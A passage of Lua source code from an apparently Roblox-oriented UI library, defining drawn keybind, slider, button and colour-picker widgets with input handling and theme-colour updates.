                            Callback = typeof(Options.Callback) == ""function"" and Options.Callback or function() end,
                            ShowRender = """",
                            AddN = false
                        }
                        --
                        Options.Flag = Options.Flag or ""AWGWJIjgAWJIGIJAWG""
                        Library.Flags[Options.Flag] = Keybind.State
                        --
                        if Keybind.StateType == ""Always"" then
                            Keybind.Callback(Keybind.State, Keybind.Key)
                            Library.Flags[Options.Flag] = true
                        end
                        --
                        Keybind.Shorten = Library.Keys.Shortened[Keybind.Key.Name] or Keybind.Key.Name
                        --
                        Keybind.ShowRender = (""[%s] %s""):format(Keybind.Shorten, Options.Title)
                        --
                        local KeybindInline = Utility.AddDrawing(""Square"", {
                            Position = Vector2.new(SectionInline.Position.X + SectionInline.Size.X - 40 - 6, SectionInline.Position.Y + Keybind.Axis + 2),
                            Size = Vector2.new(40, 14),
                            Thickness = 0,
                            Color = Library.Theme.Inline,
                            Visible = true,
                            Filled = true
                        })
                        --
                        local KeybindOutline = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(KeybindInline.Size.X - 2, KeybindInline.Size.Y - 2),
                            Position = Vector2.new(KeybindInline.Position.X + 1, KeybindInline.Position.Y + 1),
                            Thickness = 0,
                            Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                            Visible = true,
                            Filled = true
                        })
                        --
                        local KeybindGradient = Utility.AddDrawing(""Image"", {
                            Size = Vector2.new(KeybindInline.Size.X - 2, KeybindInline.Size.Y - 2),
                            Position = Vector2.new(KeybindInline.Position.X + 1, KeybindInline.Position.Y + 1),
                            Data = Library.Theme.Gradient,
                            Transparency = 1,
                            Visible = true
                        })
                        --
                        local KeybindValue = Utility.AddDrawing(""Text"", {
                            Text = Keybind.Shorten,
                            Position = Vector2.new(KeybindInline.Position.X + (KeybindInline.Size.X / 2), KeybindInline.Position.Y),
                            Center = true,
                            Outline = false,
                            Font = Library.Theme.Font,
                            Size = Library.Theme.TextSize,
                            Color = Library.Theme.Text,
                            Visible = true,
                            ZIndex = 2
                        })
                        --
                        local KeybindHoldInline = Utility.AddDrawing(""Square"", {
                            Position = Vector2.new(SectionInline.Position.X + SectionInline.Size.X + 2 - 6, SectionInline.Position.Y + Keybind.Axis + 2),
                            Size = Vector2.new(60, 16),
                            Thickness = 0,
                            Color = Library.Theme.Inline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local KeybindHoldOutline = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(KeybindHoldInline.Size.X - 2, KeybindHoldInline.Size.Y - 2),
                            Position = Vector2.new(KeybindHoldInline.Position.X + 1, KeybindHoldInline.Position.Y + 1),
                            Thickness = 0,
                            Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local KeybindHoldGradient = Utility.AddDrawing(""Image"", {
                            Size = Vector2.new(KeybindHoldInline.Size.X - 2, KeybindHoldInline.Size.Y - 2),
                            Position = Vector2.new(KeybindHoldInline.Position.X + 1, KeybindHoldInline.Position.Y + 1),
                            Data = Library.Theme.Gradient,
                            Transparency = 1,
                            Visible = true,
                            ZIndex = 3
                        })
                        --
                        local KeybindHoldValue = Utility.AddDrawing(""Text"", {
                            Text = ""Hold"",
                            Position = Vector2.new(KeybindHoldInline.Position.X + (KeybindHoldInline.Size.X / 2), KeybindHoldInline.Position.Y),
                            Center = true,
                            Outline = false,
                            Font = Library.Theme.Font,
                            Size = Library.Theme.TextSize,
                            Color = Library.Theme.Text,
                            Visible = true,
                            ZIndex = 3
                        })
                        --
                        local KeybindToggleInline = Utility.AddDrawing(""Square"", {
                            Position = Vector2.new(SectionInline.Position.X + SectionInline.Size.X + 2 - 6, SectionInline.Position.Y + Keybind.Axis + 18),
                            Size = Vector2.new(60, 16),
                            Thickness = 0,
                            Color = Library.Theme.Inline,
                            Visible = true,
                            Filled = true
                        })
                        --
                        local KeybindToggleOutline = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(KeybindToggleInline.Size.X - 2, KeybindToggleInline.Size.Y - 2),
                            Position = Vector2.new(KeybindToggleInline.Position.X + 1, KeybindToggleInline.Position.Y + 1),
                            Thickness = 0,
                            Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local KeybindToggleGradient = Utility.AddDrawing(""Image"", {
                            Size = Vector2.new(KeybindToggleInline.Size.X - 2, KeybindToggleInline.Size.Y - 2),
                            Position = Vector2.new(KeybindToggleInline.Position.X + 1, KeybindToggleInline.Position.Y + 1),
                            Data = Library.Theme.Gradient,
                            Transparency = 1,
                            Visible = true,
                            ZIndex = 3
                        })
                        --
                        local KeybindToggleValue = Utility.AddDrawing(""Text"", {
                            Text = ""Toggle"",
                            Position = Vector2.new(KeybindToggleInline.Position.X + (KeybindToggleInline.Size.X / 2), KeybindToggleInline.Position.Y),
                            Center = true,
                            Outline = false,
                            Font = Library.Theme.Font,
                            Size = Library.Theme.TextSize,
                            Color = Library.Theme.Text,
                            Visible = true,
                            ZIndex = 3
                        })
                        --
                        local KeybindAlwaysInline = Utility.AddDrawing(""Square"", {
                            Position = Vector2.new(SectionInline.Position.X + SectionInline.Size.X + 2 - 6, SectionInline.Position.Y + Keybind.Axis + 34),
                            Size = Vector2.new(60, 16),
                            Thickness = 0,
                            Color = Library.Theme.Inline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local KeybindAlwaysOutline = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(KeybindAlwaysInline.Size.X - 2, KeybindAlwaysInline.Size.Y - 2),
                            Position = Vector2.new(KeybindAlwaysInline.Position.X + 1, KeybindAlwaysInline.Position.Y + 1),
                            Thickness = 0,
                            Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local KeybindAlwaysGradient = Utility.AddDrawing(""Image"", {
                            Size = Vector2.new(KeybindAlwaysInline.Size.X - 2, KeybindAlwaysInline.Size.Y - 2),
                            Position = Vector2.new(KeybindAlwaysInline.Position.X + 1, KeybindAlwaysInline.Position.Y + 1),
                            Data = Library.Theme.Gradient,
                            Transparency = 1,
                            Visible = true,
                            ZIndex = 3
                        })
                        --
                        local KeybindAlwaysValue = Utility.AddDrawing(""Text"", {
                            Text = ""Always"",
                            Position = Vector2.new(KeybindAlwaysInline.Position.X + (KeybindAlwaysInline.Size.X / 2), KeybindAlwaysInline.Position.Y),
                            Center = true,
                            Outline = false,
                            Font = Library.Theme.Font,
                            Size = Library.Theme.TextSize,
                            Color = Library.Theme.Text,
                            Visible = true,
                            ZIndex = 3
                        })
                        --
                        function Keybind:Drop(State)
                            KeybindHoldInline.Visible = State
                            KeybindHoldOutline.Visible = State
                            KeybindHoldGradient.Visible = State
                            KeybindHoldValue.Visible = State
    
                            KeybindToggleInline.Visible = State
                            KeybindToggleOutline.Visible = State
                            KeybindToggleGradient.Visible = State
                            KeybindToggleValue.Visible = State
    
                            KeybindAlwaysInline.Visible = State
                            KeybindAlwaysOutline.Visible = State
                            KeybindAlwaysGradient.Visible = State
                            KeybindAlwaysValue.Visible = State
                        end
                        --
                        function Keybind:SetStateType(State)
                            if State == ""Hold"" then
                                Keybind.StateType = ""Hold""
    
                                KeybindAlwaysValue.Color = Library.Theme.Text
                                KeybindToggleValue.Color = Library.Theme.Text
                                KeybindHoldValue.Color = Library.Theme.Accent[1]
                            elseif State == ""Toggle"" then
                                Keybind.StateType = ""Toggle""
    
                                KeybindAlwaysValue.Color = Library.Theme.Text
                                KeybindToggleValue.Color = Library.Theme.Accent[1]
                                KeybindHoldValue.Color = Library.Theme.Text
                            else
                                Keybind.StateType = ""Always""
    
                                KeybindAlwaysValue.Color = Library.Theme.Accent[1]
                                KeybindToggleValue.Color = Library.Theme.Text
                                KeybindHoldValue.Color = Library.Theme.Text
                            end
                        end
                        --
                        Utility.AddConnection(UserInput.InputBegan, function(Input, Useless)
                            if Input.UserInputType == Enum.UserInputType.MouseButton1 then
                                if Keybind.Binding then
                                    Keybind.Binding = false
                                    Keybind.Key = Enum.UserInputType.MouseButton1
                                    Keybind.EnumType = ""UserInputType""
                                    local Old = Keybind.Shorten
                                    Keybind.Shorten = Library.Keys.Shortened[Keybind.Key.Name] or Keybind.Key.Name
                                    Window.BindList = string.gsub(Window.BindList, ""\n%["" .. Old .. ""%] "" .. Options.Title, (""\n[%s] %s""):format(Keybind.Shorten, Options.Title))
                                    KeybindValue.Text = Keybind.Binding and ""[...]"" or Keybind.Shorten
                                end
                                if Utility.OnMouse(KeybindHoldInline) then
                                    Keybind:SetStateType(""Hold"")
                                end
                                if Utility.OnMouse(KeybindToggleInline) then
                                    Keybind:SetStateType(""Toggle"")
                                end
                                if Utility.OnMouse(KeybindAlwaysInline) then
                                    Keybind:SetStateType(""Always"")
                                end
                                if Utility.OnMouse(KeybindInline) then
                                    for Index, Value in pairs(Tab.Dropdowns[Side]) do
                                        if Value then
                                            return
                                        end
                                    end
                                    if Keybind.Binding then
                                        Keybind.Binding = false
                                        KeybindValue.Text = Keybind.Shorten
                                        Keybind.ShowRender = (""[%s] %s""):format(Keybind.Shorten, Options.Title)
                                    else
                                        Keybind.Binding = true
                                        KeybindValue.Text = Keybind.Binding and ""[...]"" or Keybind.Shorten
                                    end
                                else
                                    if Utility.OnMouse(KeybindHoldInline) or Utility.OnMouse(KeybindToggleInline) or Utility.OnMouse(KeybindAlwaysInline) then
                                        return
                                    end
                                    Keybind.Dropped = false
                                    Keybind:Drop(Keybind.Dropped)
                                    Tab.Dropdowns[""Left""][ToggleTitle.Text] = Keybind.Dropped
                                    Tab.Dropdowns[""Right""][ToggleTitle.Text] = Keybind.Dropped
                                end
                            elseif Input.UserInputType == Enum.UserInputType.Keyboard then
                                if Keybind.Binding then
                                    Keybind.Binding = false
                                    Keybind.Key = Input.KeyCode
                                    Keybind.EnumType = ""KeyCode""
                                    local Old = Keybind.Shorten
                                    Keybind.Shorten = Library.Keys.Shortened[Keybind.Key.Name] or Keybind.Key.Name
                                    KeybindValue.Text = Keybind.Shorten
                                    Window.BindList = string.gsub(Window.BindList, ""\n%["" .. Old .. ""%] "" .. Options.Title, (""\n[%s] %s""):format(Keybind.Shorten, Options.Title))
                                    Keybind.ShowRender = (""[%s] %s""):format(Keybind.Shorten, Options.Title)
                                end
                            elseif Input.UserInputType == Enum.UserInputType.MouseButton2 then
                                if Keybind.Binding then
                                    Keybind.Binding = false
                                    Keybind.Key = Enum.UserInputType.MouseButton2
                                    Keybind.EnumType = ""UserInputType""
                                    local Old = Keybind.Shorten
                                    Keybind.Shorten = Library.Keys.Shortened[Keybind.Key.Name] or Keybind.Key.Name
                                    KeybindValue.Text = Keybind.Shorten
                                    Window.BindList = string.gsub(Window.BindList, ""\n%["" .. Old .. ""%] "" .. Options.Title, (""\n[%s] %s""):format(Keybind.Shorten, Options.Title))
                                    Keybind.ShowRender = (""[%s] %s""):format(Keybind.Shorten, Options.Title)
                                end
                                if Utility.OnMouse(KeybindInline) then
                                    Keybind.Dropped = not Keybind.Dropped
                                    Keybind:Drop(Keybind.Dropped)
                                    Tab.Dropdowns[""Left""][ToggleTitle.Text] = Keybind.Dropped
                                    Tab.Dropdowns[""Right""][ToggleTitle.Text] = Keybind.Dropped
                                end
                            end
                        end)
                        --
                        Utility.AddConnection(UserInput.InputBegan, function(Input, Useless)
                            if (Keybind.EnumType == ""KeyCode"" and Input.KeyCode == Keybind.Key) or (Keybind.EnumType == ""UserInputType"" and Input.UserInputType == Keybind.Key) then
                                if Keybind.StateType ~= ""Always"" then
                                    if Keybind.StateType == ""Toggle"" then
                                        Keybind.State = not Keybind.State
                                    elseif Keybind.StateType == ""Hold"" then
                                        Keybind.State = true
                                    end
                                    if Keybind.State then
                                        if not string.find(Window.BindList, ""\n%["" .. Keybind.Shorten .. ""%] "" .. Options.Title) then
                                            Window.BindList = Window.BindList .. ""\n"" .. Keybind.ShowRender
                                        end
                                    else
                                        Keybind:RemoveFromKeyBindGui()
                                    end
                                    Keybind.Callback(Keybind.State, Keybind.Key)
                                    Library.Flags[Options.Flag] = Keybind.State
                                end
                            end
                        end)
                        --
                        Utility.AddConnection(RunService.Stepped, function(Input, Useless)
                            if Keybind.StateType == ""Always"" then
                                Keybind.State = true
                                Keybind.Callback(Keybind.State, Keybind.Key)
                                Library.Flags[Options.Flag] = Keybind.State
                                if not string.find(Window.BindList, ""\n%["" .. Keybind.Shorten .. ""%] "" .. Options.Title) then
                                    Window.BindList = Window.BindList .. ""\n"" .. Keybind.ShowRender
                                end
                            end
                        end)
                        --
                        Keybind:SetStateType(Keybind.StateType)
                        --
                        function Keybind:RemoveFromKeyBindGui()
                            Window.BindList = string.gsub(Window.BindList, ""\n%["" .. Keybind.Shorten .. ""%] "" .. Options.Title, """")
                        end
                        --
                        Utility.AddConnection(UserInput.InputEnded, function(Input, Useless)
                            if (Keybind.EnumType == ""KeyCode"" and Input.KeyCode == Keybind.Key) or (Keybind.EnumType == ""UserInputType"" and Input.UserInputType == Keybind.Key) then
                                if Keybind.StateType ~= ""Always"" then
                                    if Keybind.StateType == ""Hold"" then
                                        Keybind.State = false
                                        Keybind:RemoveFromKeyBindGui()
                                        Keybind.Callback(Keybind.State, Keybind.Key)
                                        Library.Flags[Options.Flag] = Keybind.State
                                    end
                                end
                            end
                        end)
                        --
                        Keybind:Drop(false)
                        --
                        Tab[""Render""][#Tab[""Render""] + 1] = KeybindTitle
                        Tab[""Render""][#Tab[""Render""] + 1] = KeybindGradient
                        Tab[""Render""][#Tab[""Render""] + 1] = KeybindInline
                        Tab[""Render""][#Tab[""Render""] + 1] = KeybindOutline
                        Tab[""Render""][#Tab[""Render""] + 1] = KeybindValue
                        --
                        return Keybind
                    end
                    --
                    return Toggle
                end
                --
                function Section:Slider(Options)
                    local Slider = {
                        TypeOf = ""Slider"",
                        Default = Options.Default or 100,
                        Decimals = Options.Decimals or 1,
                        Axis = Section.ContentAxis,
                        Max = Options.Max or 200,
                        Min = Options.Min or 0,
                        Dragging = false,
                        Symbol = Options.Symbol or """",
                        Current = Options.Default,
                        Callback = typeof(Options.Callback) == ""function"" and Options.Callback or function() end
                    }
                    --
                    Options.Flag = Options.Flag or ""AWGWJIjgAWJIGIJAWG""
                    Library.Flags[Options.Flag] = Slider.Default
                    --
                    if Slider.Min > Slider.Max then 
                        Slider.Min = Slider.Max - 1 
                    end
                    if Slider.Default < Slider.Min then 
                        Slider.Default = Slider.Min 
                    end
                    if Slider.Default > Slider.Max then 
                        Slider.Default = Slider.Max 
                    end
                    --
                    local SliderInline = Utility.AddDrawing(""Square"", {
                        Position = Vector2.new(SectionInline.Position.X + 8, SectionInline.Position.Y + 23 + Slider.Axis + 15),
                        Size = Vector2.new(SectionOutline.Size.X - 12, 13),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local SliderOutline = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(SliderInline.Size.X - 2, SliderInline.Size.Y - 2),
                        Position = Vector2.new(SliderInline.Position.X + 1, SliderInline.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local SliderBar = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(SliderOutline.Size.X / 2, SliderOutline.Size.Y),
                        Position = Vector2.new(SliderOutline.Position.X, SliderOutline.Position.Y),
                        Thickness = 0,
                        Transparency = 0.75,
                        Color = Library.Theme.Accent[1], --Library.Theme.Outline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local SliderGradient = Utility.AddDrawing(""Image"", {
                        Size = Vector2.new(SliderInline.Size.X - 2, SliderInline.Size.Y - 2),
                        Position = Vector2.new(SliderInline.Position.X + 1, SliderInline.Position.Y + 1),
                        Data = Library.Theme.Gradient,
                        Transparency = 0.5,
                        Visible = false
                    })
                    --
                    local SliderTitle = Utility.AddDrawing(""Text"", {
                        Text = Options.Title,
                        Position = Vector2.new(SliderInline.Position.X, SliderInline.Position.Y - 17),
                        Center = false,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 2
                    })
                    --
                    local SliderValue = Utility.AddDrawing(""Text"", {
                        Position = Vector2.new(SliderInline.Position.X + (SliderInline.Size.X / 2), SliderInline.Position.Y),
                        Center = true,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 2
                    })
                    --
                    SliderValue.Outline = true
                    --
                    Utility.AddConnection(Library.Communication.Event, function(Type, Color)
                        if Type == ""Accent"" then
                            SliderBar.Color = Color
                        elseif Type == ""LightContrast"" then
                            SliderOutline.Color = Color
                        elseif Type == ""Text"" then
                            SliderTitle.Color = Color
                            SliderValue.Color = Color
                        elseif Type == ""Inline"" then
                            SliderInline.Color = Color
                        end
                    end)
                    --
                    function Slider:SetText(Text)
                        SliderText.Text = Text
                    end
    
                    function Slider:Set(GetValue, ConvertToMin)
                        if GetValue > Slider.Max then return end
                        if GetValue < Slider.Min then return end
                        
                        local Bracket = 1 / Slider.Decimals
                        local DecimalsCon = math.clamp(math.round(GetValue * Bracket) / Bracket, Slider.Min, Slider.Max)
                        local Percent = 1 - ((Slider.Max - DecimalsCon) / (Slider.Max - Slider.Min))
                        SliderBar.Size = Vector2.new(SliderOutline.Size.X * Percent, SliderOutline.Size.Y)
                        SliderValue.Text = (""%s%s/%s%s""):format(DecimalsCon, Slider.Symbol, Slider.Max, Slider.Symbol)
                        Library.Flags[Options.Flag] = GetValue
                        Slider.Callback(GetValue)
                    end
    
                    function Slider:SetMax(NewMax)
                        if NewMax < Slider.Current then Slider.Current = NewMax end
                        if Slider.Current < Slider.Min then return end
    
                        Slider.Max = NewMax
                        local DecimalsCon = math.clamp(math.round(Slider.Current * Slider.Decimals) / Slider.Decimals, Slider.Min, Slider.Max)
                        local Percent = 1 - ((Slider.Max - DecimalsCon) / (Slider.Max - Slider.Min))
                        SliderBar.Size = Vector2.new(SliderOutline.Size.X * Percent, SliderOutline.Size.Y)
                        SliderValue.Text = (""%s%s/%s%s""):format(DecimalsCon, Slider.Symbol, Slider.Max, Slider.Symbol)
                        Library.Flags[Options.Flag] = Slider.Current
                        Slider.Callback(Slider.Current)
                    end
    
                    function Slider:SetMin(NewMin)
                        Slider.Min = NewMin
                        if Slider.Current > Slider.Max then return end
                        if Slider.Current < Slider.Min then return end
    
                        local DecimalsCon = math.clamp(math.round(Slider.Current * Slider.Decimals) / Slider.Decimals, Slider.Min, Slider.Max)
                        local Percent = 1 - ((Slider.Max - DecimalsCon) / (Slider.Max - Slider.Min))
                        SliderBar.Size = Vector2.new(SliderOutline.Size.X * Percent, SliderOutline.Size.Y)
                        SliderValue.Text = (""%s%s/%s%s""):format(DecimalsCon, Slider.Symbol, Slider.Max, Slider.Symbol)
                        Library.Flags[Options.Flag] = Slider.Current
                        Slider.Callback(Slider.Current)
                    end
    
                    function Slider:Refresh()
                        local Percent = math.clamp((Mouse.X - SliderOutline.Position.X) / (SliderOutline.Size.X), 0, 1)
                        local Bracket = 1 / Slider.Decimals
                        local Value = math.floor((Slider.Min + (Slider.Max - Slider.Min) * Percent) * Bracket) / Bracket
                        Value = math.clamp(Value, Slider.Min, Slider.Max)
                        Slider:Set(Value)
                    end
    
                    Slider:Set(Slider.Default)
                
                    --
                    Utility.AddConnection(UserInput.InputBegan, function(Input, Useless)
                        
                        for Index, Value in pairs(Tab.Dropdowns[Side]) do
                            if Value then
                                return
                            end
                        end
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 and Utility.OnMouse(SliderOutline) then
                            Slider:Refresh()
                            Slider.Dragging = true
                        end
                    end)
                    --
                    Utility.AddConnection(UserInput.InputEnded, function(Input, Useless)
                        
                        for Index, Value in pairs(Tab.Dropdowns[Side]) do
                            if Value then
                                return
                            end
                        end
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 then
                            Slider.Dragging = false
                        end
                    end)
                    --
                    Utility.AddConnection(UserInput.InputChanged, function(Input, Useless)
                        if Utility.OnMouse(SliderInline) then
                            SliderInline.Color = Library.Theme.Accent[1]
                        else
                            SliderInline.Color = Library.Theme.Inline
                        end
                        
                        for Index, Value in pairs(Tab.Dropdowns[Side]) do
                            if Value then
                                return
                            end
                        end
                        if Input.UserInputType == Enum.UserInputType.MouseMovement and Slider.Dragging then
                            Slider:Refresh()
                        end
                    end)
                    --
                    Section.ContentAxis = Section.ContentAxis + SliderOutline.Size.Y + 24
                    Tab.SectionAxis = {
                        Side == ""Left"" and Tab.SectionAxis[1] + SliderOutline.Size.Y + 24 or Tab.SectionAxis[1], 
                        Side == ""Right"" and Tab.SectionAxis[2] + SliderOutline.Size.Y + 24 or Tab.SectionAxis[2]
                    }
                    --
                    self:UpdateSizeY(Section.ContentAxis + SliderOutline.Size.Y)
                    --
                    Tab[""Render""][#Tab[""Render""] + 1] = SliderInline
                    Tab[""Render""][#Tab[""Render""] + 1] = SliderOutline
                    Tab[""Render""][#Tab[""Render""] + 1] = SliderTitle
                    Tab[""Render""][#Tab[""Render""] + 1] = SliderGradient
                    Tab[""Render""][#Tab[""Render""] + 1] = SliderBar
                    Tab[""Render""][#Tab[""Render""] + 1] = SliderValue
                    --
                    return Slider
                end
                --
                function Section:Button(Options)
                    local Button = {
                        Title = Options.Title or ""LMAO"",
                        Axis = Section.ContentAxis,
                        Callback = typeof(Options.Callback) == ""function"" and Options.Callback or function() end
                    }
                    --
                    local ButtonInline = Utility.AddDrawing(""Square"", {
                        Position = Vector2.new(SectionInline.Position.X + 8, SectionInline.Position.Y + 24 + Button.Axis),
                        Size = Vector2.new(SectionOutline.Size.X - 12, 18),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local ButtonOutline = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(ButtonInline.Size.X - 2, ButtonInline.Size.Y - 2),
                        Position = Vector2.new(ButtonInline.Position.X + 1, ButtonInline.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local ButtonGradient = Utility.AddDrawing(""Image"", {
                        Size = ButtonOutline.Size,
                        Position = ButtonOutline.Position,
                        Data = Library.Theme.Gradient,
                        Transparency = 0.5,
                        Visible = true
                    })
                    --
                    local ButtonTitle = Utility.AddDrawing(""Text"", {
                        Text = Options.Title,
                        Position = Vector2.new(ButtonInline.Position.X + (ButtonInline.Size.X / 2), ButtonInline.Position.Y + 2),
                        Center = true,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 2
                    })
                    --
                    Utility.AddConnection(Library.Communication.Event, function(Type, Color)
                        if Type == ""LightContrast"" then
                            ButtonOutline.Color = Color
                        elseif Type == ""Text"" then
                            ButtonTitle.Color = Color
                        elseif Type == ""Inline"" then
                            ButtonInline.Color = Color
                        end
                    end)
                    --
                    Utility.AddConnection(UserInput.InputChanged, function(Input, Useless)
                        if Utility.OnMouse(ButtonInline) then
                            ButtonInline.Color = Library.Theme.Accent[1]
                        else
                            ButtonInline.Color = Library.Theme.Inline
                        end
                    end)
                    --
                    function Button:EmitEffect()
                        ButtonOutline.Color = Library.Theme.LightContrast
                        delay(0.1, function()
                            pcall(function()
                                ButtonOutline.Color = Library.Theme.DarkContrast
                            end)
                        end)
                    end
                    --
                    Utility.AddConnection(UserInput.InputBegan, function(Input, Useless)
                        
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 and Utility.OnMouse(ButtonOutline) then
                            for Index, Value in pairs(Tab.Dropdowns[Side]) do
                                if Value then
                                    return
                                end
                            end
                            Button:EmitEffect()
                            Button.Callback()
                        end
                    end)
                    --
                    Section.ContentAxis = Section.ContentAxis + ButtonOutline.Size.Y + 6
                    Tab.SectionAxis = {
                        Side == ""Left"" and Tab.SectionAxis[1] + ButtonOutline.Size.Y + 6 or Tab.SectionAxis[1], 
                        Side == ""Right"" and Tab.SectionAxis[2] + ButtonOutline.Size.Y + 6 or Tab.SectionAxis[2]
                    }
                    --
                    self:UpdateSizeY(Section.ContentAxis + ButtonOutline.Size.Y)
                    --
                    Tab[""Render""][#Tab[""Render""] + 1] = ButtonInline
                    Tab[""Render""][#Tab[""Render""] + 1] = ButtonGradient
                    Tab[""Render""][#Tab[""Render""] + 1] = ButtonOutline
                    Tab[""Render""][#Tab[""Render""] + 1] = ButtonTitle
                    --
                    return Button
                end
                --
                function Section:Colorpicker(Options)
                    local Colorpicker = {
                        Axis = Section.ContentAxis,
                        Color = Options.Color,
                        HexColor = Options.Color:ToHex(),
                        Dropped = false,
                        Offsets = {
                            X = 0,
                            Y = 0
                        },
                        Colors = {
                            HSV = {1, 1, 1}
                        },
                        SaturationDragging = false,
                        HueDragging = false,
                        Decimals = 50,
                        Rainbow = false,
                        Flag = Options.Flag,
                        Title = Options.Title or ""Color Picker"",
                        Callback = typeof(Options.Callback) == ""function"" and Options.Callback or function() end
                    }
                    --
                    Library.Flags[Colorpicker.Flag] = Colorpicker.HexColor
                    --
                    local H, S, V = Colorpicker.Color:ToHSV()
                    Colorpicker.Colors.HSV[1] = H
                    Colorpicker.Colors.HSV[2] = S
                    Colorpicker.Colors.HSV[3] = V
                    --
                    local ColorpickerTitle = Utility.AddDrawing(""Text"", {
                        Text = Options.Title,
                        Position = Vector2.new(SectionInline.Position.X + 8, SectionInline.Position.Y + 23 + Colorpicker.Axis),
                        Center = false,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 2
                    })
                    --
                    local ColorpickerInline = Utility.AddDrawing(""Square"", {
                        Position = Vector2.new((SectionInline.Position.X + SectionInline.Size.X) - 38, SectionInline.Position.Y + 23 + Colorpicker.Axis),
                        Size = Vector2.new(30, 12),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local ColorpickerOutline = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(ColorpickerInline.Size.X - 2, ColorpickerInline.Size.Y - 2),
                        Position = Vector2.new(ColorpickerInline.Position.X + 1, ColorpickerInline.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local ColorpickerBase = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(ColorpickerInline.Size.X - 2, ColorpickerInline.Size.Y - 2),
                        Position = Vector2.new(ColorpickerInline.Position.X + 1, ColorpickerInline.Position.Y + 1),
                        Thickness = 0,
                        Color = Colorpicker.Color, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local ColorpickerGradient = Utility.AddDrawing(""Image"", {
                        Size = Vector2.new(ColorpickerInline.Size.X - 2, ColorpickerInline.Size.Y - 2),
                        Position = Vector2.new(ColorpickerInline.Position.X + 1, ColorpickerInline.Position.Y + 1),
                        Data = Library.Theme.Gradient,
                        Transparency = 0.5,
                        Visible = true
                    })
                    --
                    local InternalInline = Utility.AddDrawing(""Square"", {
                        Position = Vector2.new((ColorpickerInline.Position.X - 225) + ColorpickerInline.Size.X, ColorpickerInline.Position.Y + 18),
                        Size = Vector2.new(225, 250),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true,
                        ZIndex = 3
                    })
                    --
                    local InternalOutline = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(InternalInline.Size.X - 2, InternalInline.Size.Y - 2),
                        Position = Vector2.new(InternalInline.Position.X + 1, InternalInline.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true,
                        ZIndex = 3
                    })
                    --
                    local InternalTopline = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(InternalOutline.Size.X, 1),
                        Position = Vector2.new(InternalOutline.Position.X, InternalOutline.Position.Y),
                        Thickness = 0,
                        Color = Library.Theme.Accent[1],
                        Visible = true,
                        Filled = true,
                        ZIndex = 3
                    })
                    --
                    Utility.AddConnection(Library.Communication.Event, function(Type, Color)
                        if Type == ""Accent"" then
                            InternalTopline.Color = Color
                        end
                    end)
                    --
                    local InternalTitle = Utility.AddDrawing(""Text"", {
                        Text = Options.Title,
                        Position = Vector2.new(InternalOutline.Position.X + 8, InternalOutline.Position.Y + 6),
                        Center = false,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 3
                    })
                    --
                    local InternalBaseInline = Utility.AddDrawing(""Square"", {
                        Position = Vector2.new(InternalOutline.Position.X + 8, InternalOutline.Position.Y + 25),
                        Size = Vector2.new(192, 192),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true,
                        ZIndex = 3
                    })
                    --
                    local InternalBase = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(192 - 4, 192 - 4),
                        Position = Vector2.new(InternalBaseInline.Position.X + 2, InternalBaseInline.Position.Y + 2),
                        Thickness = 0,
                        Color = Options.Color, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true,
                        ZIndex = 3
                    })
                    --
                    local InternalSaturation = Utility.AddDrawing(""Image"", {
                        Size = Vector2.new(196 - 2, 196 - 2),
